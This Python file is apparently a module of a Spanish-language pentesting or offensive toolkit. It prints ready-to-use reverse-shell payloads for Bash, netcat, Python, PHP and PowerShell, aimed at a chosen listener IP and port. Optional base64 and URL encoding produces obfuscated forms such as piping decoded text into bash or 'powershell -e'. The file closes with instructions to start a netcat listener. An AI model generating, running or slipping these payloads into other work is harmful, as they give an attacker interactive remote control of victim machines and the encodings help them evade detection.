import base64
import urllib.parse
import sys

class Colors:
    HEADER = '\033[95m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def format_payload(payload_name, payload_text, use_base64=False, use_urlencode=False):
    print(f"\n{Colors.OKCYAN}[*] {payload_name}{Colors.ENDC}")
    
    if use_base64:
        encoded = base64.b64encode(payload_text.encode()).decode()
        if "PowerShell" in payload_name:
            payload_text = f"powershell -e {base64.b64encode(payload_text.encode('utf-16-le')).decode()}"
        elif "Bash" in payload_name:
            payload_text = f"echo {encoded} | base64 -d | bash"
        else:
            payload_text = encoded
            
    if use_urlencode:
        payload_text = urllib.parse.quote(payload_text)
        
    print(f"{Colors.OKGREEN}{payload_text}{Colors.ENDC}")

def run(ip, port, use_base64=False, use_urlencode=False):
    print(f"{Colors.HEADER}{Colors.BOLD}============================================================")
    print("  MÓDULO PAYLOADS v2.0 (Obsidian Tier)")
    print(f"============================================================{Colors.ENDC}\n")
    print(f"[*] Target LHOST: {ip}")
    print(f"[*] Target LPORT: {port}")
    
    if use_base64:
        print(f"[*] Encoding: Base64")
    if use_urlencode:
        print(f"[*] Encoding: URL Encode")
        
    print("\n── Reverse Shells ──")
    
    bash_payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    format_payload("Bash (TCP)", bash_payload, use_base64, use_urlencode)
    
    nc_payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f"
    format_payload("Netcat (Mkfifo)", nc_payload, use_base64, use_urlencode)
    
    python_payload = f"export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'"
    format_payload("Python 3", python_payload, use_base64, use_urlencode)
    
    php_payload = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"bash <&3 >&3 2>&3\");'"
    format_payload("PHP", php_payload, use_base64, use_urlencode)
    
    ps_payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    format_payload("PowerShell", ps_payload, use_base64, use_urlencode)
    
    print("\n")
    print(f"{Colors.WARNING}[!] Recordá abrir tu listener:{Colors.ENDC}")
    print(f"    nc -lvnp {port}")
    print(f"    rlwrap nc -lvnp {port} (Recomendado para Windows)")
